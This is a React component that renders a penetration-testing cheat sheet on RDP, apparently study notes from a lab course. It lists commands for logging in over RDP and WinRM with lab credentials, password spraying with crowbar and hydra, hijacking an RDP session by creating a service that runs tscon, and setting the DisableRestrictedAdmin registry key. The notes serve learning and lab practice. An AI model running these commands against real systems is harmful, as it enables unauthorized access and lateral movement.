import rdp_session from '../../assets/rdp_session.png';
import rdp_admin_session from '../../assets/rdp_admin_session.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const RDP = () => {
    return(
        <section>
            <h1>RDP</h1>
            <div className="waring">
                <p>xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248</p>
            </div>

            <hr />
            <h2>WinRM</h2>
            <div className="waring">
                <p>evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!</p>
            </div>

            <hr />
            <h2>Crowbar - RDP Password Spraying</h2>

            <div className="waring">
                <p>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</p>
            </div>

            <div className="waring">
                <p>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</p>
            </div>

            <hr />
            <h2>RDP Session Hijacking</h2>

            <div className="waring">
                <p>whoami</p>
                <p>query user</p>
                <p>sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"</p>
            </div>

            <div className='waring'>
                <p>net start sessionhijack</p>
            </div>

            <ExampleFrame screen={rdp_session} />

            <hr />
            <h2>Dodanie klucza rejestru DisableRestrictedAdmin</h2>
            <p>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</p>
            <ExampleFrame screen={rdp_admin_session} />
        </section>
    )
};

export default RDP;